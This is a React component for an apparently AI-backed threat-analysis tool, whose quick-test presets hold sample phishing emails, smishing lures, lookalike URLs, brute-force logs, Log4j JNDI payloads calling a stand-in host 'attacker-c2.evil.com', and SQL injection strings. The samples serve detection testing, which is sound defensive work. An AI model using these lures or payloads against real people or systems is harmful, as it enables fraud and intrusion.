import React, { useState } from 'react';
import { 
  ShieldAlert, 
  AlertTriangle, 
  Globe, 
  Mail, 
  FileCode, 
  HelpCircle, 
  Zap, 
  CheckCircle2, 
  Circle, 
  Copy, 
  Check, 
  Download, 
  ExternalLink, 
  Bookmark, 
  BookmarkCheck, 
  RefreshCw,
  Sparkles,
  ShieldCheck,
  Flame,
  Info
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { AnalysisCategory, RiskLevel, SecurityAnalysisResult, UserProfile } from '../types';
import { runSecurityAnalysis } from '../services/api';
import { saveUserAnalysis, toggleAnalysisActionCompleted, toggleBookmarkAnalysis } from '../services/storage';

interface SecurityAnalysisProps {
  user: UserProfile;
  onViewHistory: () => void;
}

// Preset samples for rapid 1-click testing across all 4 categories
const PRESETS: Record<AnalysisCategory, { title: string; payload: string }[]> = {
  message: [
    {
      title: 'Executive Wire Phishing (CEO Fraud)',
      payload: `From: CEO <richard.hendricks@piedpiper-corp-sec.com>
Subject: URGENT: Confidential Acquisition Transfer
To: finance-team@piedpiper.com

I am currently in an off-site partner board meeting and cannot take calls. We need an immediate wire transfer of $48,500 for the acquisition retainer. Wire instructions attached. Please process before 3:00 PM EST today. Do not notify the general team until press release.

Regards,
Richard Hendricks, CEO`,
    },
    {
      title: 'IT Support MFA Reset Smishing (SMS)',
      payload: `[IT-ALERT] Your Corporate Okta Single Sign-On has detected suspicious access from Moscow, RU. To retain access and prevent account lock, verify your Multi-Factor Authentication immediately: https://okta-sso-verify-auth.net/mfa?uid=emp_4492`,
    },
    {
      title: 'Fake DHL Package Delivery Lure',
      payload: `DHL Express: We were unable to deliver your package #US-88921-DX due to unpaid customs fee of $2.40. Please update your delivery address and credit card details within 24h to avoid return to sender: https://dhl-customs-tracking-portal.top/pay`,
    },
  ],
  url: [
    {
      title: 'Spoofed Bank Login with Obfuscated Parameter',
      payload: `https://chase-security-update-portal.com/auth/login.php?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&redirect=statement_view`,
    },
    {
      title: 'Typosquatted Google OAuth Phishing Link',
      payload: `https://accounts-g00gle.com/o/oauth2/auth?client_id=corporate-app&response_type=token&scope=email%20profile`,
    },
    {
      title: 'Suspicious IP with Staged Payload Path',
      payload: `http://185.220.101.45:8080/bin/x86_64/update.sh?client=miner`,
    },
  ],
  log: [
    {
      title: 'Linux Server SSH Auth.log Brute Force',
      payload: `Aug 30 08:14:22 edge-bastion-01 sshd[28491]: Failed password for root from 194.26.29.112 port 48212 ssh2
Aug 30 08:14:24 edge-bastion-01 sshd[28495]: Failed password for invalid user admin from 194.26.29.112 port 48218 ssh2
Aug 30 08:14:26 edge-bastion-01 sshd[28501]: Failed password for invalid user ubuntu from 194.26.29.112 port 48224 ssh2
Aug 30 08:14:31 edge-bastion-01 sshd[28512]: Accepted password for deploy from 194.26.29.112 port 48240 ssh2
Aug 30 08:14:33 edge-bastion-01 sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash`,
    },
    {
      title: 'Apache Web Log: Log4j CVE-2021-44228 Exploit Attempt',
      payload: `198.51.100.77 - - [30/Aug/2026:09:12:04 +0000] "GET /login HTTP/1.1" 200 4521 "\${jndi:ldap://attacker-c2.evil.com:1389/Exploit}" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
198.51.100.77 - - [30/Aug/2026:09:12:05 +0000] "POST /api/v1/auth HTTP/1.1" 500 128 "\${jndi:dns://attacker-c2.evil.com/leak}" "curl/7.68.0"`,
    },
    {
      title: 'SQL Injection Error in Web Application Access Log',
      payload: `203.0.113.45 - - [30/Aug/2026:08:45:11] "GET /products.php?id=1%27%20UNION%20SELECT%20null,username,password_hash%20FROM%20users--%20 HTTP/1.1" 200 8920
203.0.113.45 - - [30/Aug/2026:08:45:14] "GET /products.php?id=1%27%20OR%201=1-- HTTP/1.1" 200 14210`,
    },
  ],
  question: [
    {
      title: 'How do I securely implement OAuth 2.0 with PKCE in single-page apps?',
      payload: 'What are the threat vectors of implementing OAuth 2.0 in a browser SPA without a backend, and why is PKCE with state verification critical to mitigate authorization code interception?',
    },
    {
      title: 'Evaluating container security posture for Kubernetes workloads',
      payload: 'What are the main risks of running Docker containers as root without read-only root filesystems and how can we enforce Pod Security Standards to prevent container breakout?',
    },
  ],
};

export const SecurityAnalysis: React.FC<SecurityAnalysisProps> = ({ user, onViewHistory }) => {
  const [selectedCategory, setSelectedCategory] = useState<AnalysisCategory>('message');
  const [inputContent, setInputContent] = useState('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [currentResult, setCurrentResult] = useState<SecurityAnalysisResult | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [copiedIndicator, setCopiedIndicator] = useState<string | null>(null);

  const handleRunAnalysis = async (customText?: string) => {
    const text = customText || inputContent;
    if (!text.trim() || isAnalyzing) return;

    setIsAnalyzing(true);
    setErrorMsg(null);

    try {
      const result = await runSecurityAnalysis(selectedCategory, text.trim());
      result.userId = user.uid;
      
      setCurrentResult(result);
      saveUserAnalysis(user.uid, result);

      // Trigger celebratory micro-confetti for clean defensive audit
      if (result.riskLevel === 'LOW') {
        confetti({ particleCount: 30, spread: 60, origin: { y: 0.8 } });
      }
    } catch (err: any) {
      console.error(err);
      setErrorMsg(err.message || 'Security threat analysis failed. Please try again.');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleSelectPreset = (presetText: string) => {
    setInputContent(presetText);
    handleRunAnalysis(presetText);
  };

  const handleToggleAction = (actionIdx: number) => {
    if (!currentResult) return;
    const updated = toggleAnalysisActionCompleted(user.uid, currentResult.id, actionIdx);
    if (updated) {
      setCurrentResult({ ...updated });
    }
  };

  const handleToggleBookmark = () => {
    if (!currentResult) return;
    toggleBookmarkAnalysis(user.uid, currentResult.id);
    setCurrentResult((prev) => prev ? { ...prev, bookmarked: !prev.bookmarked } : null);
  };

  const handleCopy = (indicator: string) => {
    navigator.clipboard.writeText(indicator);
    setCopiedIndicator(indicator);
    setTimeout(() => setCopiedIndicator(null), 2000);
  };

  const handleExportIncidentReport = () => {
    if (!currentResult) return;
    const markdown = `# AegisAI Incident Report
**Incident ID:** ${currentResult.id}
**Timestamp:** ${new Date(currentResult.timestamp).toISOString()}
**Analyst:** ${user.displayName} (${user.email})
**Category:** ${currentResult.category.toUpperCase()}
**Risk Level:** ${currentResult.riskLevel}
**Threat Classification:** ${currentResult.threatType}

---
### Executive Summary
${currentResult.summary}

### Deep Technical Explanation
${currentResult.explanation}

### Identified Red Flags & Warning Signs
${currentResult.warningSigns.map((w) => `- [!] ${w}`).join('\n')}

### Recommended Defensive Remediation
${currentResult.defensiveActions.map((a) => `- [${a.completed ? 'x' : ' '}] ${a.action}`).join('\n')}

### Indicators of Compromise (IOCs)
${(currentResult.technicalIndicators || []).map((ioc) => `- \`${ioc}\``).join('\n')}

### MITRE ATT&CK Mapping
${(currentResult.mitreAttackTags || []).map((t) => `- ${t}`).join('\n')}

---
*Raw Input Payload:*
\`\`\`
${currentResult.rawInput}
\`\`\`
`;
    const blob = new Blob([markdown], { type: 'text/markdown' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `AegisAI-Incident-${currentResult.id}.md`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Helper for Risk styling
  const getRiskBadge = (level: RiskLevel) => {
    switch (level) {
      case 'CRITICAL':
        return {
          bg: 'bg-red-900/30 text-red-400 border-red-900/50',
          label: 'Critical',
          strokeColor: '#ff3366',
          score: 95,
          offset: 18,
        };
      case 'HIGH':
        return {
          bg: 'bg-red-900/30 text-red-400 border-red-900/50',
          label: 'Elevated',
          strokeColor: '#ff3366',
          score: 75,
          offset: 91,
        };
      case 'MEDIUM':
        return {
          bg: 'bg-yellow-900/30 text-yellow-400 border-yellow-900/50',
          label: 'Moderate',
          strokeColor: '#f59e0b',
          score: 50,
          offset: 182,
        };
      case 'LOW':
      default:
        return {
          bg: 'bg-emerald-950/40 text-emerald-400 border-emerald-900/50',
          label: 'Low Risk',
          strokeColor: '#00f2fe',
          score: 15,
          offset: 310,
        };
    }
  };

  return (
    <div id="security-analysis-studio" className="max-w-7xl mx-auto px-4 py-4">
      {/* Studio Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between pb-4 mb-6 border-b border-[#1f2937] gap-3">
        <div>
          <h2 className="text-xl font-bold tracking-tighter text-white uppercase font-sans">
            Security Deep Analysis
          </h2>
          <p className="text-[11px] font-mono text-gray-500 uppercase tracking-widest mt-0.5">
            Submit Suspicious Message, URL, or Server Log Telemetry
          </p>
        </div>

        <button
          onClick={onViewHistory}
          className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-[#111827] hover:bg-[#1f2937] border border-[#1f2937] hover:border-[#00f2fe]/40 text-gray-300 hover:text-[#00f2fe] font-mono text-xs transition-all"
        >
          <span>View Past Scans</span>
        </button>
      </div>

      {/* Main Workspace Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Category Selector & Input Form (5 cols) */}
        <div className="lg:col-span-5 space-y-5">
          {/* Category Tabs */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            <button
              onClick={() => setSelectedCategory('message')}
              className={`flex flex-col items-center justify-center p-3 rounded-lg border text-xs font-mono transition-all ${
                selectedCategory === 'message'
                  ? 'bg-[#00f2fe]/10 border-[#00f2fe]/40 text-[#00f2fe] shadow-[0_0_10px_rgba(0,242,254,0.15)]'
                  : 'bg-[#0a0c10] border-[#1f2937] text-gray-400 hover:bg-[#111827] hover:text-white'
              }`}
            >
              <Mail className="w-4 h-4 mb-1" />
              <span>Message</span>
            </button>

            <button
              onClick={() => setSelectedCategory('url')}
              className={`flex flex-col items-center justify-center p-3 rounded-lg border text-xs font-mono transition-all ${
                selectedCategory === 'url'
                  ? 'bg-[#00f2fe]/10 border-[#00f2fe]/40 text-[#00f2fe] shadow-[0_0_10px_rgba(0,242,254,0.15)]'
                  : 'bg-[#0a0c10] border-[#1f2937] text-gray-400 hover:bg-[#111827] hover:text-white'
              }`}
            >
              <Globe className="w-4 h-4 mb-1" />
              <span>URL Link</span>
            </button>

            <button
              onClick={() => setSelectedCategory('log')}
              className={`flex flex-col items-center justify-center p-3 rounded-lg border text-xs font-mono transition-all ${
                selectedCategory === 'log'
                  ? 'bg-[#00f2fe]/10 border-[#00f2fe]/40 text-[#00f2fe] shadow-[0_0_10px_rgba(0,242,254,0.15)]'
                  : 'bg-[#0a0c10] border-[#1f2937] text-gray-400 hover:bg-[#111827] hover:text-white'
              }`}
            >
              <FileCode className="w-4 h-4 mb-1" />
              <span>Log Data</span>
            </button>

            <button
              onClick={() => setSelectedCategory('question')}
              className={`flex flex-col items-center justify-center p-3 rounded-lg border text-xs font-mono transition-all ${
                selectedCategory === 'question'
                  ? 'bg-[#00f2fe]/10 border-[#00f2fe]/40 text-[#00f2fe] shadow-[0_0_10px_rgba(0,242,254,0.15)]'
                  : 'bg-[#0a0c10] border-[#1f2937] text-gray-400 hover:bg-[#111827] hover:text-white'
              }`}
            >
              <HelpCircle className="w-4 h-4 mb-1" />
              <span>Threat Q&A</span>
            </button>
          </div>

          {/* Quick 1-Click Test Presets */}
          <div className="p-4 rounded-xl bg-[#0a0c10] border border-[#1f2937]">
            <p className="text-[10px] font-bold text-gray-500 uppercase tracking-[0.2em] mb-2 flex items-center gap-1.5">
              <Zap className="w-3 h-3 text-[#00f2fe]" />
              <span>Quick-Test Presets ({selectedCategory.toUpperCase()})</span>
            </p>
            <div className="space-y-1.5">
              {PRESETS[selectedCategory].map((preset, idx) => (
                <button
                  key={idx}
                  onClick={() => handleSelectPreset(preset.payload)}
                  className="w-full text-left px-3 py-2 rounded-lg bg-[#111827] hover:bg-[#1f2937] border border-[#1f2937] hover:border-[#00f2fe]/40 text-xs text-gray-300 hover:text-[#00f2fe] transition-all font-mono truncate"
                >
                  ⚡ {preset.title}
                </button>
              ))}
            </div>
          </div>

          {/* Submit Panel with Editorial Styling */}
          <div className="p-6 bg-[#0a0c10] border border-[#1f2937] rounded-xl shadow-lg">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-sm font-semibold text-white">
                {selectedCategory === 'message' && 'Submit Suspicious Message'}
                {selectedCategory === 'url' && 'Submit URL / Domain Link'}
                {selectedCategory === 'log' && 'Submit Server / Syslog Data'}
                {selectedCategory === 'question' && 'Submit Threat Inquiry'}
              </h3>
              <div className="flex gap-1.5">
                <div className="w-2 h-2 rounded-full bg-[#111827] border border-[#1f2937]"></div>
                <div className="w-2 h-2 rounded-full bg-[#111827] border border-[#1f2937]"></div>
                <div className="w-2 h-2 rounded-full bg-[#111827] border border-[#1f2937]"></div>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">
                  Submit Payload
                </label>
                <textarea
                  value={inputContent}
                  onChange={(e) => setInputContent(e.target.value)}
                  placeholder="Paste suspicious message headers, links, or log lines here..."
                  rows={6}
                  disabled={isAnalyzing}
                  className="w-full bg-[#050608] border border-[#1f2937] rounded-lg p-3 text-xs font-mono text-[#00f2fe] focus:outline-none focus:border-[#00f2fe]/50 resize-none transition-colors"
                />
              </div>

              {errorMsg && (
                <div className="p-3 rounded-lg bg-rose-950/50 border border-rose-800/50 text-rose-300 text-xs font-mono">
                  {errorMsg}
                </div>
              )}

              <div className="flex items-center justify-between gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setInputContent('')}
                  className="text-xs font-mono text-gray-500 hover:text-gray-300"
                >
                  Clear Input
                </button>

                <button
                  id="run-analysis-btn"
                  onClick={() => handleRunAnalysis()}
                  disabled={!inputContent.trim() || isAnalyzing}
                  className="w-full py-3 bg-gradient-to-r from-[#00f2fe] to-[#4facfe] text-black font-bold text-xs uppercase tracking-widest rounded-lg shadow-lg active:scale-[0.98] transition-all disabled:opacity-40 disabled:active:scale-100 flex items-center justify-center gap-2"
                >
                  {isAnalyzing ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>Scanning Heuristics...</span>
                    </>
                  ) : (
                    <>
                      <Zap className="w-3.5 h-3.5" />
                      <span>Execute AI Heuristics</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Right Column: Interactive Analysis Results & Risk Meter (7 cols) */}
        <div className="lg:col-span-7">
          {currentResult ? (
            <div className="space-y-6 bg-[#0a0c10] border border-[#1f2937] rounded-xl p-6 shadow-2xl">
              {/* Header with Risk Circular Profile */}
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between pb-4 border-b border-[#1f2937] gap-4">
                <div className="flex items-center gap-4">
                  {/* Circular Risk Progress SVG from Editorial Theme */}
                  <div className="relative w-16 h-16 flex items-center justify-center flex-shrink-0">
                    <svg className="w-full h-full -rotate-90">
                      <circle cx="32" cy="32" r="28" stroke="#111827" strokeWidth="5" fill="transparent" />
                      <circle
                        cx="32"
                        cy="32"
                        r="28"
                        stroke={getRiskBadge(currentResult.riskLevel).strokeColor}
                        strokeWidth="5"
                        strokeDasharray="175.9"
                        strokeDashoffset={(175.9 * (100 - getRiskBadge(currentResult.riskLevel).score)) / 100}
                        fill="transparent"
                        strokeLinecap="round"
                      />
                    </svg>
                    <div className="absolute inset-0 flex flex-col items-center justify-center">
                      <span className="text-xs font-black text-white font-mono">
                        {getRiskBadge(currentResult.riskLevel).score}%
                      </span>
                    </div>
                  </div>

                  <div>
                    <div className="flex items-center gap-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider border ${getRiskBadge(currentResult.riskLevel).bg}`}>
                        {getRiskBadge(currentResult.riskLevel).label}
                      </span>
                      <span className="text-[10px] font-mono text-gray-500 uppercase">
                        [{currentResult.category}]
                      </span>
                    </div>
                    <h3 className="text-sm font-semibold text-white mt-1">
                      {currentResult.threatType}
                    </h3>
                  </div>
                </div>

                {/* Card Action Buttons */}
                <div className="flex items-center gap-2">
                  <button
                    onClick={handleToggleBookmark}
                    className="p-2 rounded-lg bg-[#111827] hover:bg-[#1f2937] text-gray-300 border border-[#1f2937] transition-all"
                    title={currentResult.bookmarked ? 'Remove Bookmark' : 'Bookmark Incident'}
                  >
                    {currentResult.bookmarked ? (
                      <BookmarkCheck className="w-4 h-4 text-[#00f2fe]" />
                    ) : (
                      <Bookmark className="w-4 h-4" />
                    )}
                  </button>
                  <button
                    onClick={handleExportIncidentReport}
                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg bg-[#111827] hover:bg-[#1f2937] border border-[#1f2937] hover:border-[#00f2fe]/40 text-gray-300 hover:text-[#00f2fe] font-mono text-xs uppercase tracking-wider transition-all"
                    title="Export Incident Markdown Report"
                  >
                    <Download className="w-3.5 h-3.5 text-[#00f2fe]" />
                    <span>Report</span>
                  </button>
                </div>
              </div>

              {/* Executive Summary */}
              <div className="p-4 rounded-xl bg-[#050608] border border-[#1f2937]">
                <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-1.5 flex items-center gap-1">
                  <Info className="w-3.5 h-3.5 text-[#00f2fe]" />
                  <span>Executive Threat Summary</span>
                </p>
                <p className="text-xs text-[#e0e0e0] leading-relaxed font-sans">
                  {currentResult.summary}
                </p>
              </div>

              {/* Technical Explanation */}
              <div>
                <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">
                  Technical Explanation
                </p>
                <p className="text-xs text-gray-300 leading-relaxed font-sans bg-[#050608] p-4 rounded-xl border border-[#1f2937] whitespace-pre-wrap">
                  {currentResult.explanation}
                </p>
              </div>

              {/* Warning Signs & Red Flags */}
              {currentResult.warningSigns && currentResult.warningSigns.length > 0 && (
                <div>
                  <p className="text-[10px] font-bold text-red-400 uppercase tracking-widest mb-2 flex items-center gap-1.5">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    <span>Identified Red Flags ({currentResult.warningSigns.length})</span>
                  </p>
                  <div className="space-y-1.5">
                    {currentResult.warningSigns.map((sign, idx) => (
                      <div
                        key={idx}
                        className="flex items-start gap-2 p-2.5 rounded-lg bg-red-950/20 border border-red-900/40 text-xs text-red-200"
                      >
                        <span className="text-red-400 font-mono">⚠️</span>
                        <span>{sign}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Step-by-Step Defensive Remediation Actions */}
              {currentResult.defensiveActions && currentResult.defensiveActions.length > 0 && (
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <p className="text-[10px] font-bold text-emerald-400 uppercase tracking-widest flex items-center gap-1.5">
                      <ShieldCheck className="w-3.5 h-3.5" />
                      <span>Defensive Actions ({currentResult.defensiveActions.filter(a => a.completed).length}/{currentResult.defensiveActions.length})</span>
                    </p>
                    <span className="text-[10px] font-mono text-gray-500">
                      Click to mark completed
                    </span>
                  </div>

                  <div className="space-y-1.5">
                    {currentResult.defensiveActions.map((item, idx) => (
                      <div
                        key={idx}
                        onClick={() => handleToggleAction(idx)}
                        className={`flex items-start gap-2.5 p-3 rounded-lg border cursor-pointer transition-all ${
                          item.completed
                            ? 'bg-emerald-950/30 border-emerald-500/30 text-emerald-200 line-through opacity-80'
                            : 'bg-[#050608] border-[#1f2937] text-gray-200 hover:border-[#00f2fe]/40'
                        }`}
                      >
                        {item.completed ? (
                          <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                        ) : (
                          <Circle className="w-4 h-4 text-gray-600 shrink-0 mt-0.5" />
                        )}
                        <span className="text-xs leading-relaxed font-sans">{item.action}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Technical Indicators / IOCs */}
              {currentResult.technicalIndicators && currentResult.technicalIndicators.length > 0 && (
                <div>
                  <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">
                    Technical Indicators / Artifacts
                  </p>
                  <div className="flex flex-wrap gap-1.5">
                    {currentResult.technicalIndicators.map((ioc, idx) => (
                      <div
                        key={idx}
                        onClick={() => handleCopy(ioc)}
                        className="group flex items-center gap-1.5 px-2.5 py-1 rounded bg-[#050608] border border-[#1f2937] text-[11px] font-mono text-[#00f2fe] hover:border-[#00f2fe]/50 cursor-pointer"
                        title="Click to copy IOC"
                      >
                        <span>{ioc}</span>
                        {copiedIndicator === ioc ? (
                          <Check className="w-3 h-3 text-emerald-400" />
                        ) : (
                          <Copy className="w-3 h-3 opacity-0 group-hover:opacity-100 transition-opacity" />
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* MITRE ATT&CK Tags */}
              {currentResult.mitreAttackTags && currentResult.mitreAttackTags.length > 0 && (
                <div className="pt-3 border-t border-[#1f2937] flex flex-wrap items-center gap-1.5">
                  <span className="text-[10px] font-mono text-gray-500 mr-1 uppercase">MITRE ATT&CK:</span>
                  {currentResult.mitreAttackTags.map((tag, idx) => (
                    <span
                      key={idx}
                      className="px-2 py-0.5 rounded bg-[#111827] text-gray-300 border border-[#1f2937] text-[10px] font-mono"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              )}
            </div>
          ) : (
            /* Empty State matching Risk Assessment Profile mock from Editorial theme */
            <div className="h-full min-h-[440px] p-6 bg-[#0a0c10] border border-[#1f2937] rounded-xl shadow-lg flex flex-col">
              <h3 className="text-sm font-semibold text-white mb-6">Risk Assessment Profile</h3>
              <div className="flex-1 flex flex-col items-center justify-center gap-4 border border-dashed border-[#1f2937] rounded-lg bg-[#050608]/50 p-8 text-center">
                <div className="relative w-32 h-32 flex items-center justify-center">
                  <svg className="w-full h-full -rotate-90">
                    <circle cx="64" cy="64" r="58" stroke="#111827" strokeWidth="8" fill="transparent"></circle>
                    <circle cx="64" cy="64" r="58" stroke="#00f2fe" strokeWidth="8" strokeDasharray="364.4" strokeDashoffset="109.3" fill="transparent" strokeLinecap="round"></circle>
                  </svg>
                  <div className="absolute inset-0 flex flex-col items-center justify-center">
                    <span className="text-2xl font-black text-white font-mono">--</span>
                    <span className="text-[8px] text-gray-500 font-bold uppercase tracking-wider">Awaiting Scan</span>
                  </div>
                </div>
                <div className="text-center px-4">
                  <p className="text-xs font-semibold text-white mb-1">Awaiting Threat Vector Submission</p>
                  <p className="text-[10px] text-gray-500 leading-relaxed max-w-sm">
                    Select a category on the left, paste suspicious text, URL, or server log snippet, or click a quick-test preset to execute AI threat heuristics.
                  </p>
                </div>
                <div className="flex gap-2 mt-2">
                  <span className="px-2 py-0.5 bg-[#111827] text-gray-400 text-[9px] rounded border border-[#1f2937] uppercase font-bold">
                    Gemini 3.6 Flash
                  </span>
                  <span className="px-2 py-0.5 bg-[#111827] text-[#00f2fe] text-[9px] rounded border border-[#1f2937] uppercase font-bold">
                    Zero-Trust Active
                  </span>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
